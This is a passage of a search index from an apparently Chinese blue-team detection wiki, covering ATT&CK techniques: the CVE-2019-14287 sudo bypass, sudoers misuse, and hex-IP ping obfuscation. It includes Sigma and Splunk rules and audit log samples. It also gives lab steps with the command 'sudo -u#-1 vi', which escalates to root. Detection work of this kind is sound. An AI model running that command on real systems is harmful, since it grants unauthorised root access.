\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c user1 ALL=(ALL) NOPASSWD: ALL [ 1] \u7684\u884c\u7684\u5bc6\u7801\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_1","text":"CVE-2019-14287 _ \u5982\u679c\u5c06sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\u6765\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u7684\u8bdd\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c06\u6709\u53ef\u80fd\u901a\u8fc7\u5236\u5b9a\u7528\u6237ID -1\u62164294967295\u6765\u4ee5root\u6743\u9650\u6267\u884c\u6076\u610f\u547d\u4ee4\u3002 \u5f53sudo\u88ab\u914d\u7f6e\u4e3a \u3010\u5141\u8bb8\u7528\u6237\u57fa\u4e8eRunas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\uff0c\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3011\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7279\u5b9a\u7684\u7528\u6237id\uff08\u5982-1\u6216\u80054294967295\uff09\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5c3d\u7ba1Runas\u89c4\u8303\u4e2d\u660e\u786e\u89c4\u8303\u4e86\u7981\u6b62root\u8bbf\u95ee\uff0c\u4f46\u53ea\u8981Runas\u89c4\u8303\u4e2d\u4f18\u5148\u51fa\u73b0\u4e86ALL\u5173\u952e\u5b57\uff0c\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u4f7f\u7528\u6b64\u547d\u4ee4\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4 \u4ee5\u8fd9\u79cd\u65b9\u5f0f\u8fd0\u884c\u7684\u547d\u4ee4\uff0c\u65e5\u5fd7\u4f1a\u628a\u7528\u6237id\u8bb0\u5f55\u4e3a4294967295\uff0c\u800c\u975eroot\u3002\u6b64\u5916\uff0cPAM\u4f1a\u8bdd\u4e0d\u4f1a\u5e72\u9884\u6b64\u547d\u4ee4\u7684\u6267\u884c\u3002 #Runas\u89c4\u8303\uff1a\u6307sudo\u914d\u7f6e\u6587\u4ef6\uff08\u4e00\u822c\u4e3a/etc/sudoers\uff09 \u4e2d\u5b9a\u4e49\u7684\u7528\u6237\u6267\u884c\u6743\u9650\u89c4\u5219 #PAM\uff08\u53ef\u63d2\u5165\u8eab\u4efd\u9a8c\u8bc1\u6a21\u5757\uff09\uff1aPAM\u5c06\u7a0b\u5e8f\u5f00\u53d1\u4e0e\u8ba4\u8bc1\u65b9\u5f0f\u8fdb\u884c\u5206\u79bb\uff0c\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8c03\u7528\u9644\u52a0\u7684\u201c\u8ba4\u8bc1\u201d\u6a21\u5757\u5b8c\u6210\u81ea\u5df1\u7684\u5de5\u4f5c\u3002\u672c\u5730\u7cfb\u7edf\u7ba1\u7406\u5458\u901a\u8fc7\u914d\u7f6e\u9009\u62e9\u8981\u4f7f\u7528\u67d0\u79cd\u8ba4\u8bc1\u6a21\u5757\u3002 \u5f71\u54cd\u7248\u672c \uff1asudo 1.8.28 \u4ee5\u4e0b\u7248\u672c","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_2","text":"linux auth.log\u65e5\u5fd7\uff0c\u65e0\u9700\u523b\u610f\u914d\u7f6e\u3002 \u6a21\u62df\u73af\u5883\uff1aubuntu 19.04","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_3","text":"\u6b65\u9aa4\u5982\u4e0b\uff1a 1\u3001\u521b\u5efa\u666e\u901a\u7528\u6237\u8d26\u6237\uff1b 2\u3001\u5207\u6362root\u6743\u9650\uff0c\u4fee\u6539/etc/sudoers \u914d\u7f6e\u6587\u4ef6\u5199\u5165\u5982\u4e0b\u89c4\u5219 abc ALL = (ALL, !root) /usr/bin/vi 3\u3001\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u4fee\u6539/etc/sudoers\u7684\u8bfb\u5199\u6743\u9650\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u5bf9\u6b64\u6587\u4ef6\u8fdb\u884c\u5199\u5165\u3002\u540c\u65f6\uff0c\u5728\u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c\u4f60\u9700\u8981\u4fee\u6539\u6b64\u6587\u4ef6\u7684\u6743\u9650\u4e3a\u53ea\u8bfb chmod u+w /etc/sudoers \uff08\u4fee\u6539\u6743\u9650\uff0c\u9ed8\u8ba4\u53ea\u8bfb\uff09 chmod u-w /etc/sudoers \uff08\u53ea\u8bfb\u6743\u9650\uff0c\u5f88\u91cd\u8981\uff09 4\u3001\u6d4b\u8bd5\uff1a\u6267\u884csudo vi \u65e0\u6743\u9650 \u200b \u6267\u884csudo -u#-1 vi \u7a81\u7834\u9650\u5236\u6210\u529f\u4ee5root\u8eab\u4efd\u6267\u884c","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_4","text":"Oct 18 11:09:54 icbc sudo: test321 : TTY=pts/1 ; PWD=/ ; USER=#-1 ; COMMAND=/usr/bin/id Oct 18 11:11:59 icbc sudo: test321 : TTY=pts/1 ; PWD=/ ; USER=#4294967295 ; COMMAND=/usr/bin/id","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#sigma","text":"title: CVE-2019-14287 sudo \u914d\u7f6e\u4e0d\u5f53-\u6743\u9650\u63d0\u5347 description: Ubuntu19.04 x64\u6d4b\u8bd5\u7ed3\u679c\uff08\u5f53sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u7684ALL\u5173\u952e\u5b57\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u6309\u901a\u8fc7\u6307\u5b9a\u7528\u6237ID-1\u62164294967295\u6210\u4e3aroot\u7528\u6237\u3002\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5373\u4f7fRunas\u89c4\u8303\u660e\u786e\u7981\u6b62root\u7528\u6237\u8bbf\u95ee\uff0c\u53ea\u8981\u5728Runas\u89c4\u8303 \u6761\u4ef6\u4e2d\u9996\u5148\u5217\u51faALL\u5173\u952e\u5b57\u5373\u53ef\uff09 references: https://sysdig.com/blog/detecting-cve-2019-14287/ tags: T1548-003 status: experimental author: Blue team logsource: product: linux detection: selection: proc.name: 'sudo:' proc.USER: - '#-1' - '#4294967295' condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_7","text":"\u76ee\u524d\u4e3b\u8981\u5f71\u54cd\u4ee5\u4e0b\u7248\u672c\uff1a sudo -V < 1.8.28 \u5347\u7ea7sudo\u7248\u672c\u81f31.8.28\u4ee5\u4e0a","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_8","text":"MITRE-ATT&CK-T1548-003 https://attack.mitre.org/techniques/T1548/003/ \u68c0\u6d4bCVE-2019-14287 https://sysdig.com/blog/detecting-cve-2019-14287/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/","text":"T1169-linux-Sudo \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 sudoers\u6587\u4ef6 /etc/sudoers \u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c user1 ALL=(ALL) NOPASSWD: ALL [ 1] \u7684\u884c\u7684\u5bc6\u7801\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b cat /etc/sudoers vim /etc/sudoers \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002 \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u4e00 icbc@icbc:/$ sudo cat /etc/sudoers \u573a\u666f\u4e8c icbc@icbc:/$ sudo vim /etc/sudoers \u6d4b\u8bd5\u7559\u75d5 type=USER_CMD msg=audit(1563520773.609:436): pid=3530 uid=1000 auid=1000 ses=3 msg='cwd=\"/\" cmd=636174202F6574632F7375646F657273 terminal=pts/0 res=success' \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002 \u68c0\u6d4b\u89c4\u5219/\u89c4\u5219 splunk\u89c4\u5219 index=linux sourcetype=\"linux_audit\" sudoers_110 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219\uff1aroot@icbc:~# auditctl -w /etc/sudoers -p war -k sudoers_110 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1548-003 https://attack.mitre.org/techniques/T1548/003/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"T1169-linux-Sudo"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#t1169-linux-sudo","text":"","title":"T1169-linux-Sudo"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#attck","text":"sudoers\u6587\u4ef6 /etc/sudoers \u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c user1 ALL=(ALL) NOPASSWD: ALL [ 1] \u7684\u884c\u7684\u5bc6\u7801\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_1","text":"cat /etc/sudoers vim /etc/sudoers \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_4","text":"icbc@icbc:/$ sudo cat /etc/sudoers","title":"\u573a\u666f\u4e00"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_5","text":"icbc@icbc:/$ sudo vim /etc/sudoers","title":"\u573a\u666f\u4e8c"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_6","text":"type=USER_CMD msg=audit(1563520773.609:436): pid=3530 uid=1000 auid=1000 ses=3 msg='cwd=\"/\" cmd=636174202F6574632F7375646F657273 terminal=pts/0 res=success' \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#splunk","text":"index=linux sourcetype=\"linux_audit\" sudoers_110 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219\uff1aroot@icbc:~# auditctl -w /etc/sudoers -p war -k sudoers_110","title":"splunk\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_8","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_9","text":"MITRE-ATT&CK-T1548-003 https://attack.mitre.org/techniques/T1548/003/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/","text":"T1027-003-win-Ping Hex IP \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7\u52a0\u5bc6\uff0c\u7f16\u7801\u6216\u5176\u4ed6\u65b9\u5f0f\u6df7\u6dc6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u6587\u4ef6\u5728\u7cfb\u7edf\u4e2d\u6216\u4f20\u8f93\u4e2d\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u4f7f\u5176\u96be\u4ee5\u53d1\u73b0\u6216\u5206\u6790\u3002\u8fd9\u662f\u5e38\u89c1\u7684\u884c\u4e3a\uff0c\u53ef\u4ee5\u8de8\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u7f51\u7edc\u4f7f\u7528\uff0c\u4ee5\u9003\u907f\u9632\u5fa1\u3002 \u6709\u6548\u8f7d\u8377\u53ef\u80fd\u88ab\u538b\u7f29\uff0c\u5b58\u6863\u6216\u52a0\u5bc6\uff0c\u4ee5\u907f\u514d\u88ab\u68c0\u6d4b\u5230\u3002\u8fd9\u4e9b\u6709\u6548\u8f7d\u8377\u53ef\u4ee5\u5728\u201c\u521d\u59cb\u8bbf\u95ee\u201d\u671f\u95f4\u6216\u4ee5\u540e\u4f7f\u7528\uff0c\u4ee5\u51cf\u8f7b\u68c0\u6d4b\u3002\u6709\u65f6\uff0c\u53ef\u80fd\u9700\u8981\u7528\u6237\u91c7\u53d6\u884c\u52a8\u624d\u80fd\u6253\u5f00\u548c\u53cd\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f\u4ee5\u4f9b\u7528\u6237\u6267\u884c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u538b\u7f29\u6216\u5b58\u6863\u811a\u672c\uff0c\u4f8b\u5982Javascript\u3002 \u8fd8\u53ef\u4ee5\u5bf9\u6587\u4ef6\u7684\u67d0\u4e9b\u90e8\u5206\u8fdb\u884c\u7f16\u7801\u4ee5\u9690\u85cf\u7eaf\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u5b83\u4eec\u5c06\u6709\u52a9\u4e8e\u9632\u5fa1\u8005\u8fdb\u884c\u53d1\u73b0\u3002\u6709\u6548\u8f7d\u8377\u4e5f\u53ef\u80fd\u88ab\u62c6\u5206\u4e3a\u770b\u4f3c\u826f\u6027\u7684\u5355\u72ec\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4ec5\u5728\u91cd\u65b0\u7ec4\u5408\u540e\u624d\u4f1a\u663e\u793a\u6076\u610f\u529f\u80fd\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u6df7\u6dc6\u4ece\u6709\u6548\u8f7d\u8377\u6267\u884c\u7684\u547d\u4ee4\u6216\u76f4\u63a5\u901a\u8fc7\u547d\u4ee4\u884c\u754c\u9762\u6267\u884c\u7684\u547d\u4ee4\u3002\u73af\u5883\u53d8\u91cf\uff0c\u522b\u540d\uff0c\u5b57\u7b26\u548c\u5176\u4ed6\u5e73\u53f0/\u8bed\u8a00\u7279\u5b9a\u7684\u8bed\u4e49\u53ef\u7528\u4e8e\u89c4\u907f\u57fa\u4e8e\u7b7e\u540d\u7684\u68c0\u6d4b\u548c\u767d\u540d\u5355\u673a\u5236\u3002 \u6d4b\u8bd5\u6848\u4f8b \u653b\u51fb\u8005\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684IP\u5730\u5740\u8fdb\u884cping\u547d\u4ee4\u63a2\u6d4b\u4e3b\u673a\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 windows 2012\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf \u6d4b\u8bd5\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Ping Hex IP description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ping_hex_ip.yml status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: selection: CommandLine: - '*\\ping.exe 0x*' - '*\\ping 0x*' condition: selection level: high \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1027-003 https://attack.mitre.org/techniques/T1027/003/ IP\u5730\u5740\u8fdb\u5236\u8f6c\u6362 https://tool.520101.com/wangluo/jinzhizhuanhuan/","title":"T1027-003-win-Ping Hex IP"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#t1027-003-win-ping-hex-ip","text":"","title":"T1027-003-win-Ping Hex IP"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7\u52a0\u5bc6\uff0c\u7f16\u7801\u6216\u5176\u4ed6\u65b9\u5f0f\u6df7\u6dc6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u6587\u4ef6\u5728\u7cfb\u7edf\u4e2d\u6216\u4f20\u8f93\u4e2d\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u4f7f\u5176\u96be\u4ee5\u53d1\u73b0\u6216\u5206\u6790\u3002\u8fd9\u662f\u5e38\u89c1\u7684\u884c\u4e3a\uff0c\u53ef\u4ee5\u8de8\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u7f51\u7edc\u4f7f\u7528\uff0c\u4ee5\u9003\u907f\u9632\u5fa1\u3002 \u6709\u6548\u8f7d\u8377\u53ef\u80fd\u88ab\u538b\u7f29\uff0c\u5b58\u6863\u6216\u52a0\u5bc6\uff0c\u4ee5\u907f\u514d\u88ab\u68c0\u6d4b\u5230\u3002\u8fd9\u4e9b\u6709\u6548\u8f7d\u8377\u53ef\u4ee5\u5728\u201c\u521d\u59cb\u8bbf\u95ee\u201d\u671f\u95f4\u6216\u4ee5\u540e\u4f7f\u7528\uff0c\u4ee5\u51cf\u8f7b\u68c0\u6d4b\u3002\u6709\u65f6\uff0c\u53ef\u80fd\u9700\u8981\u7528\u6237\u91c7\u53d6\u884c\u52a8\u624d\u80fd\u6253\u5f00\u548c\u53cd\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f\u4ee5\u4f9b\u7528\u6237\u6267\u884c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u538b\u7f29\u6216\u5b58\u6863\u811a\u672c\uff0c\u4f8b\u5982Javascript\u3002 \u8fd8\u53ef\u4ee5\u5bf9\u6587\u4ef6\u7684\u67d0\u4e9b\u90e8\u5206\u8fdb\u884c\u7f16\u7801\u4ee5\u9690\u85cf\u7eaf\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u5b83\u4eec\u5c06\u6709\u52a9\u4e8e\u9632\u5fa1\u8005\u8fdb\u884c\u53d1\u73b0\u3002\u6709\u6548\u8f7d\u8377\u4e5f\u53ef\u80fd\u88ab\u62c6\u5206\u4e3a\u770b\u4f3c\u826f\u6027\u7684\u5355\u72ec\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4ec5\u5728\u91cd\u65b0\u7ec4\u5408\u540e\u624d\u4f1a\u663e\u793a\u6076\u610f\u529f\u80fd\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u6df7\u6dc6\u4ece\u6709\u6548\u8f7d\u8377\u6267\u884c\u7684\u547d\u4ee4\u6216\u76f4\u63a5\u901a\u8fc7\u547d\u4ee4\u884c\u754c\u9762\u6267\u884c\u7684\u547d\u4ee4\u3002\u73af\u5883\u53d8\u91cf\uff0c\u522b\u540d\uff0c\u5b57\u7b26\u548c\u5176\u4ed6\u5e73\u53f0/\u8bed\u8a00\u7279\u5b9a\u7684\u8bed\u4e49\u53ef\u7528\u4e8e\u89c4\u907f\u57fa\u4e8e\u7b7e\u540d\u7684\u68c0\u6d4b\u548c\u767d\u540d\u5355\u673a\u5236\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_1","text":"\u653b\u51fb\u8005\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684IP\u5730\u5740\u8fdb\u884cping\u547d\u4ee4\u63a2\u6d4b\u4e3b\u673a\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_3","text":"windows 